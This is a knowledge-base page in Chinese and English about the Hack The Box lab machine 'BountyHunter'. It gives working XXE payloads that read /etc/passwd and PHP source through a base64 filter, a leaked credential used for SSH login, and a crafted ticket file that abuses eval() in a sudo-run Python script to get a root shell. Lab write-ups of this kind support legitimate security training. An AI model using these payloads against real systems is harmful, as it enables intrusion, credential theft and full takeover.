---
title: XML 外部实体与二次解释
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/xml/
categories:
- Web安全
- XML与数据解析
tags:
- 知识库
- XXE
- 编码
- Python
- eval
description: BountyHunter 把 XML 实体读取与本地票据校验串到同一条来源链。本章重点保留请求编码、文件读取证据，以及票据文本进入 eval 前必须满足的格式和算术条件。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

BountyHunter 把 XML 实体读取与本地票据校验串到同一条来源链。本章重点保留请求编码、文件读取证据，以及票据文本进入 eval 前必须满足的格式和算术条件。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/xml/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Base64 和 URL 编码影响加号等字符在请求与响应中的传输。

票据文件头、目标行和余数判断决定代码是否走到解释执行。

Spider、Mimic 和其他含 XML 的案例可通过知识库主题索引交叉查阅。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [XML 编码链与票据校验中的 eval](#case-bountyhunter) | bountyhunter | XXE、编码、Python、eval |

<a id="case-bountyhunter"></a>

## XML 编码链与票据校验中的 eval

XXE 请求的 Base64 与 URL 编码顺序会影响特殊字符传输。提权入口要求票据文件头和余数条件均成立后才进入 eval。

<p class="kb-provenance">来源 bountyhunter · 原记录 2021-07-26 · 15 个代码块 · 13 处图片引用</p>

<details class="kb-evidence" id="record-bountyhunter">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start bountyhunter -->

#### introduce

OS: Linux
Difficulty: Easy
Points:	20
Release:	24 Jul 2021
IP:	10.10.11.100

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2036.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### Enumeration

use nmap as usual

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2037.jpg)

port 80 and 22

looks like we have a form we can submit stuff info

``` bash
http://10.10.11.100/log_submit.php
```

see burpsuite history

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2038.jpg)

looks like data in this post requests gets encoded base64

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2039.jpg)

``` bash
http://10.10.11.100/resources/README.txt
```

looks like we should be able to use test acount on the portal and there should be a plaintext password stored somewhere

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2040.jpg)

looks like we have an xxe vulnerability

https://portswigger.net/web-security/xxe

use the following method to generate payload

in the http://10.10.11.100//log_submit.php page:

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <bugreport>
    <title>&xxe;</title>
    <cwe>test</cwe>
    <cvss>test</cvss>
    <reward>test</reward>
    </bugreport>
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2041.jpg)

after some more enumeration we find 

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2042.jpg)

let's try to read the source code for this page

convert the below to base64, then to url encoding

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php">]>
    <bugreport>
    <title>&xxe;</title>
    <cwe>test</cwe>
    <cvss>test</cvss>
    <reward>test</reward>
    </bugreport>
```

and we receive the following in return

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2043.jpg)

this encoding scheme must be used in order to avoid problematic characters like "+" in the sent package, and the symbols in the returned file cred!

``` bash
admin:m19RoAU0hP41A1sTsq6K
```

refer to the /etc/passwd file we get before, we ssh into target

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2044.jpg)

``` bash
ssh development@10.10.11.100
```

and get the user flag

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2034.jpg)

#### Privesc

``` bash
sudo -l
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2045.jpg)

``` python
cat /opt/skytrain_inc/ticketValidator.py

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

looks like it is looking for a .md file

``` python
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()
```

this .md file needs to contain "# Skytrain Inc" in the first line:

``` python
for i,x in enumerate(ticketFile.readlines()):
    if i == 0:
        if not x.startswith("# Skytrain Inc"):
            return False
        continue
```

line two needs to contain "## Ticket to "

``` python
if i == 1:
    if not x.startswith("## Ticket to "):
        return False
    print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
    continue
```

next it's looking for "__Ticket Code:__"

``` python
if x.startswith("__Ticket Code:__"):
    code_line = i+1
    continue
```

and here we have a little bit of math:

``` python
if code_line and i == code_line:
    if not x.startswith("**"):
        return False
    ticketCode = x.replace("**", "").split("+")[0]
    if int(ticketCode) % 7 == 4:
        validationNumber = eval(x.replace("**", ""))
        if validationNumber > 100:
            return True
        else:
            return False
```

but it looks like we need to have a string that begins with ** and the ticket code must return a remainder of 4 when divided by 7, then we get to eval(); which should allow us to call a system shell:

``` bash
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**102+ 10 == 112 and __import__('os').system('/bin/bash') == False
```

 - note: there is a space after "## Ticket to" string, ortherwise it would appear an error and failed

save it to 111.md, then run:

``` bash
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py


then enter:
/home/development/111.md
```

now we get root and the root flag:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2035.jpg)

#### Summary of knowledge

 - use xxe get ssh creds
 - privesc through root permission /opt/skytrain_inc/ticketValidator.py file

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end bountyhunter -->

</details>

